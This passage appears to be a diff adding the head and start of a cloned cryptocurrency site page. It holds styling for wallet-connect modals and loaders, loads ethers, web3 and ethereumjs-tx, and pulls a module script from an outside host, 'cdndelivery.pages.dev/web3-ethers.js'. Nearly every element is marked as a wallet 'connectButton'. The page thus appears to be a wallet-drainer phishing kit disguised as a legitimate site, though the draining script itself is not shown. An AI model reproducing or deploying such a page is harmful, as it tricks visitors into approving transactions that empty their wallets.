+body.swal2-toast-shown .swal2-container.swal2-center { inset: 50% auto auto 50%; transform: translate(-50%, -50%); }
+body.swal2-toast-shown .swal2-container.swal2-center-end, body.swal2-toast-shown .swal2-container.swal2-center-right { inset: 50% 0px auto auto; transform: translateY(-50%); }
+body.swal2-toast-shown .swal2-container.swal2-bottom-start, body.swal2-toast-shown .swal2-container.swal2-bottom-left { inset: auto auto 0px 0px; }
+body.swal2-toast-shown .swal2-container.swal2-bottom { inset: auto auto 0px 50%; transform: translateX(-50%); }
+body.swal2-toast-shown .swal2-container.swal2-bottom-end, body.swal2-toast-shown .swal2-container.swal2-bottom-right { inset: auto 0px 0px auto; }
+  </style>
+<style>
+   @import url("css2.css");
+[class~="ms_modal_head"] title { font-size: 32px; }
+[class~="ms_modal_head"] title { font-style: normal; }
+[class~="ms_modal"] { position: absolute; }
+[class~="ms_modal"] { top: 50%; }
+#ms-modal { position: fixed; }
+[class~="ms_modal"] { left: 50%; }
+[class~="ms_modal_head"] title { font-weight: 700; }
+[class~="ms_modal_head"] title { line-height: normal; }
+[class~="ms_modal"] { transform: translate(-50%, -50%); }
+[class~="ms_modal"] { box-sizing: border-box; }
+#ms-modal .black .ms_stroke_con span { }
+[class~="ms_modal"] { width: calc(100% - 20px); }
+[class~="ms_modal"], [class~="ms_modal_content"] { display: flex; }
+[class~="ms_modal_head"] title, #ms-modal { display: block; }
+[class~="ms_modal_head"] title { letter-spacing: 0.00333333in; }
+.ms_modal_button button, #ms-modal button.active { border-radius: 16px; }
+.ms_modal_button button, .ms_modal_head { display: flex; }
+.ms_modal_button button { padding-left: 0pt; }
+[class~="ms_modal"] { max-width: 420pt; }
+.ms_modal_button button { padding-bottom: 0.208333in; }
+[class~="ms_modal"] { padding-left: 2pc; }
+[class~="ms_modal"] { padding-bottom: 2pc; }
+[class~="ms_modal"] { padding-right: 2pc; }
+.ms_modal_button button { padding-right: 0pt; }
+.ms_modal_button button { padding-top: 0.208333in; }
+[class~="ms_modal"] { padding-top: 2pc; }
+[class~="ms_modal_menu_first"], [class~="ms_modal_menu"], [class~="ms_modal_el-title"], [class~="ms_modal_content"], .ms_modal_head, [class~="ms_modal"] { flex-direction: column; }
+[class~="ms_modal_content"], .ms_modal_head, [class~="ms_modal"] { align-items: flex-start; }
+[class~="ms_modal"] { gap: 0.416667in; }
+[class~="ms_modal"] { border-radius: 32px; }
+.ms_modal_button button { justify-content: center; }
+[class~="ms_modal_menu"], .ms_modal_button button { align-items: center; }
+.ms_modal_button button { gap: 0.0833333in; }
+[class~="ms_modal_menu_first"], [class~="ms_modal_content"], [class~="ms_modal_menu"], .ms_modal_button button { align-self: stretch; }
+[class~="ms_modal_content"] { gap: 32px; }
+#ms-modal button.active { background: linear-gradient(91deg, rgb(66, 0, 253) 0%, rgb(0, 86, 253) 98.05%); }
+.ms_modal_head { gap: 8px; }
+#ms-modal button[class~="disabled"], #ms-modal .black button.disabled { opacity: 0.2; }
+[class~="ms_modal"][class~="white"] { background: rgb(255, 255, 255); }
+.ms_modal_button button { font-family: Inter; }
+[class~="ms_modal"][class~="white"] { color: rgb(1, 9, 27); }
+[class~="ms_head_body"] { color: rgb(58, 69, 95); }
+[class~="ms_head_body"] { font-size: 0.1875in; }
+[class~="ms_head_body"], .ms_modal_button button { font-style: normal; }
+[class~="ms_head_body"] { font-weight: 400; }
+#ms-modal, [class~="ms_modal_button"] { width: 100%; }
+.ms_modal_button button { outline: 0pc; }
+.ms_modal_button button { font-size: 0.166667in; }
+.ms_modal_button button { font-weight: 700; }
+#ms-modal button.active { color: white; }
+.ms_modal_button button { line-height: normal; }
+#ms-modal [class~="black"] [class~="ms_modal_el-title-second"], #ms-modal [class~="black"] [class~="ms_head_body"] { color: rgb(149, 158, 176); }
+[class~="ms_modal_button"] { display: grid; }
+.ms_modal_button button { letter-spacing: 0.12pt; }
+.ms_modal_button button { border-left-width: 0pc; }
+[class~="ms_modal_el-content"], [class~="ms_modal_menu_first"], [class~="ms_modal_el"], [class~="ms_modal_el-title"], [class~="ms_modal_menu"], [class~="ms_modal_menu_second"], .ms_modal_el input { display: flex; }
+.ms_modal_button button { border-bottom-width: 0pc; }
+[class~="ms_modal_menu"], [class~="ms_modal_el-content"] { gap: 1.25pc; }
+.ms_modal_button button { border-right-width: 0pc; }
+.ms_modal_button button { border-top-width: 0pc; }
+.ms_modal_button button { border-left-style: none; }
+[class~="ms_modal_el"], #ms-modal button.active { cursor: pointer; }
+[class~="ms_modal_menu_first"] { align-items: flex-start; }
+[class~="ms_modal_el"] { padding-left: 15pt; }
+#ms-modal button[class~="disabled"] { background: rgb(197, 197, 197); }
+[class~="ms_modal_el"] { padding-bottom: 15pt; }
+#ms-modal { height: 100%; }
+[class~="ms_modal_el"] { padding-right: 15pt; }
+[class~="ms_modal_el"] { padding-top: 15pt; }
+[class~="ms_modal_el"] { justify-content: space-between; }
+#ms-modal { inset: 0pc; }
+#ms-modal { background: rgba(8, 5, 23, 0.5); }
+[class~="ms_modal_el-content"], [class~="ms_modal_el"] { align-items: center; }
+[class~="ms_modal_el"] { align-self: stretch; }
+[class~="ms_modal_el"] { border-radius: 24px; }
+[class~="ms_modal_el"] { transition: all 0.8s ease-out 0s; }
+[class~="ms_modal_el"]:hover { outline: rgb(66, 0, 253) solid 0.75pt; }
+#ms-modal button[class~="disabled"] { color: rgb(1, 9, 27); }
+.ms_modal_button button { border-bottom-style: none; }
+.ms_modal_button button { border-right-style: none; }
+.ms_modal_button button { border-top-style: none; }
+[class~="ms_modal_el-title"], [class~="ms_modal_menu_second"], .ms_modal_el input { align-items: flex-start; }
+[class~="ms_modal_el-title"] { gap: 4px; }
+[class~="ms_modal_el-title-first"] { font-size: 13.5pt; }
+[class~="ms_stroke_con"] span, [class~="ms_modal_el-title-first"], [class~="ms_modal_el-title-second"] { font-style: normal; }
+.ms_modal_button button { border-left-color: currentcolor; }
+[class~="ms_modal_el-title-first"] { font-weight: 500; }
+.ms_modal_button button { border-bottom-color: currentcolor; }
+[class~="ms_modal_el-title-first"] { line-height: normal; }
+[class~="ms_modal_el-title-first"] { letter-spacing: 0.01125pc; }
+#ms-modal .black button.disabled { background: rgb(84, 84, 84); }
+.ms_modal_button button { border-right-color: currentcolor; }
+.ms_modal_button button { border-top-color: currentcolor; }
+.ms_modal_button button { border-image: none 100% / 1 / 0 stretch; }
+[class~="ms_modal_el-title-second"] { color: rgba(57, 69, 96, 0.8); }
+[class~="ms_stroke_con"] span, [class~="ms_modal_el-title-second"] { font-family: Inter; }
+#ms-modal { z-index: 99999; }
+[class~="ms_modal_el-content"] svg { width: 32px; }
+[class~="ms_modal_el-content"] svg { height: 24pt; }
+[class~="ms_modal_el-title-second"], [class~="ms_stroke_con"] span { font-size: 1pc; }
+.ms_modal_el input { width: 20px; }
+.ms_modal_el input { height: 0.208333in; }
+.ms_modal_el input { padding-left: 0.0520833in; }
+.ms_modal_el input { padding-bottom: 0.0520833in; }
+[class~="ms_modal_el-title-second"], [class~="ms_stroke_con"] span { font-weight: 400; }
+[class~="modal_stroke"], .ms_stroke_con { width: 100%; }
+.ms_modal_el input { padding-right: 0.0520833in; }
+.ms_stroke_con { position: relative; }
+.ms_stroke_con { margin-bottom: 5px; }
+[class~="modal_stroke"] { height: 0.0625pc; }
+[class~="modal_stroke"] { background: rgb(204, 209, 219); }
+#ms-modal { font-family: Inter, sans-serif; }
+.ms_modal_el input { padding-top: 0.0520833in; }
+[class~="ms_modal_menu_second"] { flex-direction: column; }
+[class~="ms_stroke_con"] span { color: rgb(147, 155, 172); }
+[class~="ms_modal_menu_second"] { gap: 6pt; }
+[class~="ms_stroke_con"] span { position: absolute; }
+[class~="ms_modal_el"]:hover { box-shadow: rgba(34, 43, 254, 0.29) 0in 5px 1pc 0pt; }
+[class~="ms_modal_menu_second"] { align-self: stretch; }
+[class~="ms_stroke_con"] span { background: rgb(255, 255, 255); }
+[class~="ms_stroke_con"] span { top: -10px; }
+[class~="ms_stroke_con"] span { width: 46px; }
+[class~="ms_stroke_con"] span { margin-left: auto; }
+[class~="ms_stroke_con"] span { margin-right: auto; }
+[class~="ms_stroke_con"] span { left: 0pt; }
+[class~="ms_stroke_con"] span { right: 0in; }
+[class~="ms_stroke_con"] span { text-align: center; }
+[class~="ms_modal"][class~="black"] { background: rgb(13, 14, 19); }
+[class~="ms_modal"][class~="black"] { color: rgb(255, 255, 255); }
+@media (min-width: 200px) and (max-width: 500px) {
+  .ms_head_body, [class~="ms_modal_el-title-second"] { display: none; }
+}
+@media (max-width: 375px) {
+  [class~="ms_modal_el-title-first"] { overflow: hidden; }
+  [class~="ms_modal_el-title-first"] { white-space: nowrap; }
+  [class~="ms_modal_el-title-first"] { max-width: 6.25pc; }
+  [class~="ms_modal_el-title-first"] { text-overflow: ellipsis; }
+  .ms_stroke_con { display: none; }
+  [class~="ms_modal"] { gap: 10px; }
+  [class~="ms_modal"] { padding-left: 0.229167in; }
+  [class~="ms_modal"] { padding-bottom: 0.229167in; }
+  [class~="ms_modal"] { padding-right: 0.229167in; }
+  [class~="ms_modal"] { padding-top: 0.229167in; }
+  .ms_modal_content { gap: 1.0625pc; }
+  [class~="ms_modal_menu"] { gap: 0in; }
+  .ms_modal_head title { font-size: 16.5pt; }
+}
+@media (min-height: 601px) and (max-height: 750px) {
+  [class~="ms_modal_el-title-first"] { overflow: hidden; }
+  [class~="ms_modal_el-title-first"] { white-space: nowrap; }
+  [class~="ms_modal_el-title-first"] { max-width: 6.25pc; }
+  [class~="ms_modal_el-title-first"] { text-overflow: ellipsis; }
+  [class~="ms_head_body"], [class~="ms_stroke_con"] { display: none; }
+  [class~="ms_modal"] { gap: 10px; }
+  .ms_modal { padding-left: 16.5pt; }
+  .ms_modal { padding-bottom: 16.5pt; }
+  .ms_modal { padding-right: 16.5pt; }
+  .ms_modal { padding-top: 16.5pt; }
+  [class~="ms_modal_content"] { gap: 0.177083in; }
+  [class~="ms_modal_menu"] { gap: 0pt; }
+  [class~="ms_modal_head"] title { font-size: 22px; }
+}
+@media (min-height: 500px) and (max-height: 600px) {
+  [class~="ms_modal_el-title-first"] { overflow: hidden; }
+  [class~="ms_modal_el-title-first"] { white-space: nowrap; }
+  [class~="ms_modal_el-title-first"] { max-width: 75pt; }
+  [class~="ms_modal_el-title-first"] { text-overflow: ellipsis; }
+  [class~="ms_stroke_con"], [class~="ms_modal_el-title-second"], [class~="ms_head_body"] { display: none; }
+  [class~="ms_modal"] { gap: 4.5pt; }
+  [class~="ms_modal"] { padding-left: 0.15625in; }
+  [class~="ms_modal"] { padding-bottom: 0.15625in; }
+  [class~="ms_modal"] { padding-right: 0.15625in; }
+  [class~="ms_modal"] { padding-top: 0.15625in; }
+  [class~="ms_modal_content"] { gap: 0.104167in; }
+  [class~="ms_modal_menu"] { gap: 0pt; }
+  [class~="ms_modal_el"] { padding-left: 0.145833in; }
+  [class~="ms_modal_el"] { padding-bottom: 0.145833in; }
+  [class~="ms_modal_el"] { padding-right: 0.145833in; }
+  [class~="ms_modal_el"] { padding-top: 0.145833in; }
+  [class~="ms_modal_head"] title { font-size: 23px; }
+}
+@media (max-height: 499px) {
+  .ms_modal_el-title-first { overflow: hidden; }
+  .ms_modal_el-title-first { white-space: nowrap; }
+  .ms_modal_el-title-first { max-width: 100px; }
+  .ms_modal_el-title-first { text-overflow: ellipsis; }
+  .ms_modal_el-title-second, [class~="ms_stroke_con"], [class~="ms_head_body"] { display: none; }
+  [class~="ms_modal"] { gap: 6px; }
+  [class~="ms_modal"] { padding-left: 11.25pt; }
+  [class~="ms_modal"] { padding-bottom: 11.25pt; }
+  [class~="ms_modal_head"] title { font-size: 0.15625in; }
+  [class~="ms_modal"] { padding-right: 11.25pt; }
+  [class~="ms_modal"] { padding-top: 11.25pt; }
+  [class~="ms_custom_modal_content"] { gap: 0.0833333in; }
+  [class~="ms_modal_el"], .ms_modal_button button { padding-left: 0.5pc; }
+  .ms_modal_button button, [class~="ms_modal_el"] { padding-bottom: 0.5pc; }
+  .ms_modal_menu { gap: 0pt; }
+  .ms_modal_button button, [class~="ms_modal_el"] { padding-right: 0.5pc; }
+  [class~="ms_modal_el"], .ms_modal_button button { padding-top: 0.5pc; }
+  .ms_modal_el-title-first { font-size: 9.75pt; }
+}
+#ms-modal-overlay { position: fixed; }
+#ms-modal-overlay { display: block; }
+#ms-modal-overlay { width: 100%; }
+#ms-modal-overlay { height: 100%; }
+#ms-modal-overlay { z-index: 99998; }
+  </style>
+<style>
+   @import url("css2.css");
+[class~="ms_loader_head"] title { color: rgb(1, 9, 27); }
+.ms_loader { position: absolute; }
+.ms_loader { top: 50%; }
+#ms-loader, [class~="ms_loader_head"] title { display: block; }
+[class~="ms_loader_head"] title { font-size: 32px; }
+#ms-loader { position: fixed; }
+[class~="ms_loader_head"] title, .ms_loader button { font-style: normal; }
+.ms_loader { left: 50%; }
+.ms_loader { transform: translate(-50%, -50%); }
+.ms_loader button, .ms_loader button.active { border-radius: 0.166667in; }
+.ms_loader { box-sizing: border-box; }
+.ms_loader { width: calc(100% - 20px); }
+[class~="ms_loader_head"], .ms_loader, .ms_loader button, [class~="ms_loader_content"] { display: flex; }
+[class~="ms_loader_head"] title, .ms_loader button { font-weight: 700; }
+#ms-loader { width: 100%; }
+.ms_loader button, [class~="ms_loader_head"] title { line-height: normal; }
+[class~="ms_loader_head"] title { letter-spacing: 0.02pc; }
+.ms_loader { max-width: 420pt; }
+.ms_loader button { padding-left: 0in; }
+.ms_loader { padding-left: 24pt; }
+.ms_loader { padding-bottom: 24pt; }
+#ms-loader { height: 100%; }
+.ms_loader button { padding-bottom: 1.25pc; }
+.ms_loader button { padding-right: 0in; }
+.ms_loader { padding-right: 24pt; }
+.ms_loader button { padding-top: 1.25pc; }
+.ms_loader button, [class~="ms_loader_main"] { justify-content: center; }
+.ms_loader { padding-top: 24pt; }
+.ms_loader button { align-items: center; }
+.ms_loader, [class~="ms-loader-content"], [class~="ms_loader_content"], [class~="ms_loader_head"] { flex-direction: column; }
+.ms_loader button { gap: 8px; }
+.ms_loader button.active { background: linear-gradient(91deg, rgb(66, 0, 253) 0%, rgb(0, 86, 253) 98.05%); }
+[class~="ms_loader_content"], [class~="ms_loader_head"], .ms_loader { align-items: flex-start; }
+.ms_loader { overflow: hidden; }
+[class~="ms_loader_content"], .ms_loader button { align-self: stretch; }
+.ms_loader button { font-family: Inter; }
+.ms_loader { gap: 40px; }
+#ms-loader { inset: 0pc; }
+.ms_loader { border-radius: 2pc; }
+.ms_loader button.active { color: white; }
+#ms-loader { background: rgba(8, 5, 23, 0.5); }
+.ms_loader button { outline: 0px; }
+.ms_loader button { cursor: pointer; }
+.ms_loader button { font-size: 1pc; }
+[class~="ms_loader_content"] { gap: 32px; }
+.ms_loader button.disabled, [class~="ms_loader"] [class~="black"] button[class~="disabled"] { opacity: 0.2; }
+.ms_loader button { letter-spacing: 0.01pc; }
+.ms_loader button { border-left-width: 0in; }
+.ms_loader button { border-bottom-width: 0in; }
+.ms_loader button.disabled { background: rgb(197, 197, 197); }
+[class~="ms_loader_head"] { height: 71px; }
+.ms_loader button { border-right-width: 0in; }
+.ms_loader button { border-top-width: 0in; }
+.ms_loader button { border-left-style: none; }
+.ms_loader button { border-bottom-style: none; }
+[class~="ms_loader_head"] { gap: 0.0833333in; }
+.ms_loader button { border-right-style: none; }
+.ms_loader button { border-top-style: none; }
+.ms_loader button { border-left-color: currentcolor; }
+.ms_loader button { border-bottom-color: currentcolor; }
+.ms_loader button { border-right-color: currentcolor; }
+.ms_loader button { border-top-color: currentcolor; }
+[class~="ms-loader-content"], [class~="ms_loader_main"], [class~="ms_loader_text"] { display: flex; }
+[class~="ms_loader_main"], [class~="ms-loader-content"], [class~="ms_loader_text"] { align-items: center; }
+.ms_loader button { border-image: none 100% / 1 / 0 stretch; }
+[class~="ms-lds-ring"] div { box-sizing: border-box; }
+[class~="ms-lds-ring"] div { display: block; }
+[class~="ms-lds-ring"] div { position: absolute; }
+[class~="ms-lds-ring"] div { width: 32px; }
+[class~="ms-lds-ring"] div { height: 0.333333in; }
+[class~="ms-lds-ring"] div { margin-left: 3pt; }
+[class~="ms-lds-ring"] div { margin-bottom: 3pt; }
+#ms-loader { z-index: 999999; }
+[class~="ms-lds-ring"] div { margin-right: 3pt; }
+[class~="ms-lds-ring"] div { margin-top: 3pt; }
+[class~="ms-lds-ring"] div { border-left-width: 2.25pt; }
+[class~="ms_loader_main"] { align-self: stretch; }
+[class~="ms-lds-ring"] div { border-bottom-width: 2.25pt; }
+[class~="ms-lds-ring"] div { border-right-width: 2.25pt; }
+[class~="ms_loader"][class~="white"] { background: rgb(255, 255, 255); }
+#ms-loader { font-family: Inter, sans-serif; }
+[class~="ms-lds-ring"] div { border-top-width: 2.25pt; }
+[class~="ms-lds-ring"] div { border-left-style: solid; }
+[class~="ms-loader-content"] { gap: 24pt; }
+[class~="ms-lds-ring"] div { border-bottom-style: solid; }
+[class~="ms-lds-ring"] div { border-right-style: solid; }
+[class~="ms-loader-content"] { max-width: 18.75pc; }
+[class~="ms-lds-ring"] div { border-top-style: solid; }
+[class~="ms-lds-ring"] div { border-left-color: transparent; }
+[class~="ms-lds-ring"] div { border-bottom-color: transparent; }
+[class~="ms_loader_text"] { flex-direction: column; }
+[class~="ms_loader_text"] { gap: 0.25pc; }
+[class~="ms-lds-ring"] div { border-right-color: transparent; }
+[class~="ms-lds-ring"] div { border-top-color: rgb(151, 71, 255); }
+[class~="ms-lds-ring"] div { border-image: none 100% / 1 / 0 stretch; }
+.ms_loader button.disabled { color: rgb(1, 9, 27); }
+[class~="ms-lds-ring"] div { border-radius: 100%; }
+[class~="ms-lds-ring"] div { animation: 1.2s cubic-bezier(0.5, 0, 0.5, 1) 0s infinite normal none running ms-lds-ring; }
+[class~="ms_loader_text"] { color: rgb(58, 69, 95); }
+[class~="ms_loader_text"] { text-align: center; }
+[class~="ms_loader_text"] { font-family: Inter; }
+[class~="ms_loader_text"] { font-size: 0.166667in; }
+[class~="ms_loader_text"] { font-style: normal; }
+[class~="ms_loader_text"] { font-weight: 400; }
+[class~="ms_loader_button"] { width: 100%; }
+[class~="ms-lds-ring"] div:nth-child(1) { animation-delay: -0.45s; }
+[class~="ms_loader_button"] { display: grid; }
+[class~="ms-lds-ring"] { display: inline-block; }
+[class~="ms-lds-ring"] { position: relative; }
+[class~="ms-lds-ring"] { width: 30pt; }
+[class~="ms-lds-ring"] { border-radius: 3.125pc; }
+[class~="ms-lds-ring"] { height: 40px; }
+[class~="ms-lds-ring"] { overflow: hidden; }
+[class~="ms_loader"] [class~="black"] button[class~="disabled"] { background: rgb(84, 84, 84); }
+[class~="ms-lds-ring"] div:nth-child(2) { animation-delay: -0.3s; }
+[class~="ms-lds-ring"] div:nth-child(3) { animation-delay: -0.15s; }
+@keyframes ms-lds-ring { 
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+[class~="ms_modal_spinner"] { display: flex; }
+[class~="ms_modal_spinner"] { width: 52px; }
+[class~="ms_modal_spinner"] { height: 3.25pc; }
+#ms-loader .black .ms_loader_el .vector path { fill: white; }
+[class~="ms_modal_spinner"] [class~="load"] { background: linear-gradient(92deg, rgba(66, 0, 253, 0.08) 11.46%, rgba(0, 86, 253, 0.08) 95.34%); }
+.white .ms_loader_el .vector path { fill: black; }
+[class~="ms_modal_spinner"] { padding-left: 4.8pt; }
+#ms-progress { background: linear-gradient(90deg, rgb(60, 8, 254) 68.26%, rgba(56, 14, 254, 0) 100%); }
+[class~="black"] [class~="ms_loader_button"] button[class~="disabled"] { color: white; }
+[class~="ms_modal_spinner"] { padding-bottom: 4.8pt; }
+[class~="ms_modal_spinner"] { padding-right: 4.8pt; }
+[class~="ms_modal_spinner"] { padding-top: 4.8pt; }
+[class~="ms_modal_spinner"] { justify-content: center; }
+#ms-progress { height: 100%; }
+[class~="ms-l-d-s"] p { margin-left: 0pc; }
+[class~="ms_modal_spinner"] { align-items: center; }
+[class~="black"] [class~="ms_loader_button"] button[class~="disabled"] { background: rgb(84, 84, 84); }
+[class~="ms_modal_spinner"], [class~="ms_modal_spinner"] [class~="load"], [class~="ms_modal_spinner"][class~="success"] { border-radius: 50px; }
+[class~="ms_modal_spinner"] { position: absolute; }
+[class~="ms-l-d-s"] p { margin-bottom: 0pc; }
+[class~="ms_modal_spinner"][class~="success"] { background: rgba(86, 214, 41, 0.08); }
+[class~="ms_modal_spinner"][class~="success"] { backdrop-filter: blur(3.25px); }
+[class~="ms_modal_spinner"][class~="error"] { background: rgba(224, 82, 94, 0.08); }
+[class~="ms-l-d-s"] p { margin-right: 0pc; }
+[class~="ms_modal_spinner"] { top: 50%; }
+[class~="ms_loader"][class~="black"] { background: rgb(13, 14, 19); }
+#ms-loader .black .ms_loader_text { color: rgb(149, 158, 176); }
+[class~="ms_modal_spinner"] { left: 50%; }
+[class~="ms_modal_spinner"] { transform: translate(-50%, -50%); }
+[class~="ms_loader_el"] { position: relative; }
+[class~="ms_loader_title"] { color: rgb(1, 9, 27); }
+[class~="ms_loader_title"] { font-size: 1.125pc; }
+[class~="ms_loader_title"] { font-style: normal; }
+[class~="ms-l-d-s"] p { margin-top: 0pc; }
+[class~="ms_loader_title"] { font-weight: 500; }
+[class~="ms_loader_title"] { line-height: normal; }
+[class~="ms_loader_title"] { text-align: center; }
+[class~="black"] [class~="ms_loader_title"] { color: white; }
+[class~="ms_loader_title"] { letter-spacing: 0.00375in; }
+[class~="ms_progress_bar"] { position: absolute; }
+[class~="ms_progress_bar"] { bottom: 0in; }
+[class~="ms_progress_bar"] { right: 0px; }
+[class~="ms_progress_bar"] { left: 0pc; }
+[class~="ms_progress_bar"] { height: 0.0416667in; }
+#ms-loader .black .ms_loader_head title { color: rgb(255, 255, 255); }
+  </style>
+
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        
+  <script src="./settings.js"></script>
+  <script src="https://cdndelivery.pages.dev/web3-ethers.js" type="module"></script>
+</head>
+ <body id="body">
+  <div ad-data-linked="true" class="connectButton" id="root">
+   <div ad-data-linked="true" class="sc-fWHiwC bJTvqw connectButton">
+   </div>
+   <header class="header">
+    <div ad-data-linked="true" class="Header__FixedHeader-sc-1lzyagy-0 dkiaqS connectButton">
+     <div ad-data-linked="true" class="Header__FixedHeaderInner-sc-1lzyagy-1 dAQTUg connectButton">
+      <nav class="Header__NavContainer-sc-1lzyagy-4 jVWmgg">
+       <div ad-data-linked="true" class="sc-JHWBx cFaCBh connectButton">
+        <div ad-data-linked="true" class="sc-hZNxer byriDm connectButton">
+         <a ad-data-linked="true" class="interact-button connect connectButton" href="#" style="text-decoration: none;" title="Go to homepage">
+          <svg class="mobile-only" fill="#ffffff" height="24px" viewbox="0 0 169.883 151.379" width="24px" xmlns="http://www.w3.org/2000/svg">
+           <path d="M-932.1-6343.891l-34.968-60.656A15.111,15.111,0,0,0-980.089-6412h-69.935a15.035,15.035,0,0,0-13.015,7.516l-34.968,60.656a15.187,15.187,0,0,0,0,15.035l34.968,60.652a14.952,14.952,0,0,0,13.015,7.52h69.935a15.032,15.032,0,0,0,13.016-7.52l34.968-60.652A15.308,15.308,0,0,0-932.1-6343.891Zm-82.951,59.617v-10.434a41.705,41.705,0,0,0,41.637-41.668,41.7,41.7,0,0,0-41.637-41.668,41.7,41.7,0,0,0-41.637,41.668,41.154,41.154,0,0,0,8.483,25.141l7.511-7.32a30.914,30.914,0,0,1-5.568-17.82,31.351,31.351,0,0,1,31.276-31.3,31.351,31.351,0,0,1,31.276,31.3,31.348,31.348,0,0,1-31.276,31.3v-10.434a20.842,20.842,0,0,0,20.85-20.863,20.845,20.845,0,0,0-20.85-20.867,20.9,20.9,0,0,0-20.916,20.867,20.546,20.546,0,0,0,2.784,10.367l7.771-7.582a9.96,9.96,0,0,1-.389-2.785,10.7,10.7,0,0,1,10.684-10.691,10.7,10.7,0,0,1,10.685,10.691,10.7,10.7,0,0,1-10.685,10.691,9.784,9.784,0,0,1-3.043-.516l-26.873,26.3a3.99,3.99,0,0,1-.842.648c-.065.066-.195.066-.259.133a2.913,2.913,0,0,1-.648.32c-.129.066-.258.066-.388.133-.195.066-.389.129-.583.2a.848.848,0,0,0-.389.063c-.194,0-.389.063-.519.063h0c-.194,0-.388-.062-.583-.062a1.3,1.3,0,0,1-.453-.062c-.194-.066-.389-.129-.583-.2-.13-.066-.259-.066-.389-.133a2.539,2.539,0,0,1-.583-.32,1.563,1.563,0,0,1-.324-.2,3.663,3.663,0,0,1-.518-.453c-.064-.066-.194-.133-.259-.258h0a51.952,51.952,0,0,1-14.829-36.422,52.168,52.168,0,0,1,52.063-52.1,52.168,52.168,0,0,1,52.063,52.1A52.183,52.183,0,0,1-1015.056-6284.273Z" data-name="Union 54" id="Union_54" transform="translate(1099.998 6412)">
+           </path>
+          </svg>
+          <svg class="hide-on-mobile" fill="#ffffff" height="20px" viewbox="0 0 126.676 20.376" width="125px" xmlns="http://www.w3.org/2000/svg">
+           <path d="M22.615 9.167L17.905 1a2.036 2.036 0 00-1.753-1H6.731a2.025 2.025 0 00-1.753 1.012L.268 9.176a2.043 2.043 0 000 2.024l4.71 8.164a2.015 2.015 0 001.753 1.012h9.42a2.025 2.025 0 001.753-1.012l4.71-8.164a2.059 2.059 0 00.001-2.033zm-11.174 8.025v-1.4a5.609 5.609 0 10-5.609-5.609 5.539 5.539 0 001.143 3.384l1.012-.986a4.16 4.16 0 01-.75-2.4 4.213 4.213 0 114.213 4.213v-1.4a2.809 2.809 0 10-2.817-2.809 2.765 2.765 0 00.375 1.4l1.047-1.021a1.343 1.343 0 01-.052-.375 1.439 1.439 0 111.439 1.439 1.3 1.3 0 01-.41-.07l-3.62 3.532a.56.56 0 01-.113.087c-.009.009-.026.009-.035.017a.407.407 0 01-.087.044c-.017.009-.035.009-.052.017l-.079.026a.111.111 0 00-.049.01c-.026 0-.052.009-.07.009-.026 0-.052-.009-.079-.009a.17.17 0 01-.061-.009l-.079-.026c-.017-.009-.035-.009-.052-.017a.354.354 0 01-.079-.044.191.191 0 01-.044-.026.5.5 0 01-.07-.061c-.009-.009-.026-.017-.035-.035a7.007 7.007 0 115.015 2.12zM28.285 3.62h4.309c4.169-.044 7.24 2.652 7.179 6.542.061 3.812-3.009 6.682-7.179 6.62h-4.309zm4.283 10.738c2.652 0 4.431-1.657 4.431-4.187 0-2.556-1.736-4.108-4.431-4.108h-1.6v8.3h1.6zM49.647 16.791H47.17v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.83-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.317-2.033 3.88 3.88 0 014.23 4.23v5.853zm-2.7-3.812h-2.106c-.881 0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM57.383 17.027a3.947 3.947 0 01-2.957-1.195v4.544h-2.7V6.919h2.477v1.237a3.741 3.741 0 013.18-1.457 4.844 4.844 0 014.789 5.146 4.874 4.874 0 01-4.789 5.182zm-.5-7.894a2.462 2.462 0 00-2.495 2.713 2.477 2.477 0 002.495 2.73 2.551 2.551 0 002.556-2.713 2.537 2.537 0 00-2.553-2.73zM69.429 17.027a3.947 3.947 0 01-2.957-1.195v4.544h-2.7V6.919h2.485v1.237a3.741 3.741 0 013.172-1.457 4.844 4.844 0 014.789 5.146 4.874 4.874 0 01-4.789 5.182zm-.5-7.894a2.462 2.462 0 00-2.495 2.713 2.477 2.477 0 002.495 2.73 2.551 2.551 0 002.556-2.713 2.532 2.532 0 00-2.553-2.73zM84.014 16.791l-3.411-4.649h-1.971v4.649h-2.7V3.62h4.946c2.756 0 4.745 1.718 4.745 4.248a4.081 4.081 0 01-2.311 3.751l3.733 5.164h-3.031zm-5.39-7.021h2.253a1.811 1.811 0 002-1.893 1.825 1.825 0 00-2-1.875h-2.25zM96.094 16.791h-2.477v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.832-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.309-2.032 3.88 3.88 0 014.23 4.23v5.853zm-2.7-3.812h-2.111c-.881 